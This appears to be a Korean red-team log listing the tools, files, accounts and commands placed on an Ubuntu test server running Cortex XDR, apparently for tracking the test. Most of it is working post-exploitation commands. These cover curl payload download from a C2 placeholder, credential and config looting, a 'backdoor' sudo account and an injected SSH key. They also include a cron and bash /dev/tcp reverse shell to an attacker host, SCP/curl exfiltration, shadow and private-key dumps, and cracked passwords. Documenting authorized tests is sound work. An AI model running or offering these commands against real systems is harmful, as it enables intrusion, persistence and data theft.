# Ubuntu 서버 — 설치된 공격 도구 및 파일 목록

> **대상 서버**: Ubuntu 22.04 LTS (172.16.157.105)  
> **Cortex XDR 에이전트 설치됨**  
> 레드팀 테스트 중 해당 서버에 직접 설치/생성/수정된 항목만 기록

---

## 📦 드롭된 파일 / 스크립트

| 경로 | 내용 | 생성 방법 |
|------|------|---------|
| `/tmp/p.sh` | 리버스쉘 페이로드 bash 스크립트 | `curl http://<c2>/payload.sh -o /tmp/p.sh` |
| `/tmp/loot.tgz` | /etc, /home, /var/log 아카이브 | `tar czf /tmp/loot.tgz /etc /home /var/log` |
| `/tmp/loot/` | 수집된 .conf, .key, .env 파일들 | `find / -name "*.conf" -exec cp {} /tmp/loot/ \;` |
| `/tmp/linpeas.sh` | 권한상승 열거 스크립트 (LinPEAS) | `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh` |

---

## 👤 생성된 계정

| 계정명 | 그룹 | 생성 명령어 |
|--------|------|-----------|
| `backdoor` | sudo | `useradd -m -s /bin/bash -G sudo backdoor` |
| (passwd 수정) | — | `/etc/passwd`에 openssl 생성 해시 직접 추가 |

---

## 🔐 수정된 인증 파일

| 파일 | 변경 내용 |
|------|---------|
| `/root/.ssh/authorized_keys` | 공격자 SSH 공개키 추가 |
| `/etc/passwd` | 추가 root-level 계정 삽입 |
| `/etc/shadow` | (읽기 접근 — 해시 덤프) |

---

## ⏰ 등록된 지속성 (Persistence)

### Cron 백도어

```bash
# /etc/crontab 에 추가된 항목
* * * * * root bash -i >& /dev/tcp/<attacker_ip>/5555 0>&1
```

---

## 🌐 네트워크 연결 (생성된 세션)

| 유형 | 명령어 | 포트 |
|------|--------|------|
| bash 리버스쉘 | `bash -i >& /dev/tcp/<attacker>/4444 0>&1` | 4444 |
| Cron 리버스쉘 | crontab 등록 | 5555 |
| SCP 유출 | `scp /tmp/loot.tgz attacker@<c2>:/exfil/` | 22 |
| curl HTTP 유출 | `curl -F "file=@/tmp/loot.tgz" http://<attacker>/upload` | 80 |

---

## 📝 수집된 크레덴셜 (덤프)

| 파일/출처 | 내용 | 명령어 |
|----------|------|--------|
| `/etc/shadow` | sha512crypt 해시 4개 | `cat /etc/shadow` |
| `/root/.bash_history` | 명령어 히스토리 | `cat /root/.bash_history` |
| `/root/.ssh/id_rsa` | RSA 개인키 | `cat /root/.ssh/id_rsa` |
| 오프라인 크랙 결과 | `sshuser:123`, `webadmin:admin123` | john + rockyou.txt |

---

## 🧹 아티팩트 요약

```
/tmp/
├── p.sh              ← 리버스쉘 페이로드
├── linpeas.sh        ← 권한상승 열거
├── loot.tgz          ← 수집 파일 아카이브
└── loot/             ← 개별 수집 파일들

/etc/crontab         ← 백도어 cron 항목 추가됨
/root/.ssh/authorized_keys  ← 공격자 키 추가됨
/etc/passwd          ← backdoor 계정 추가됨
```
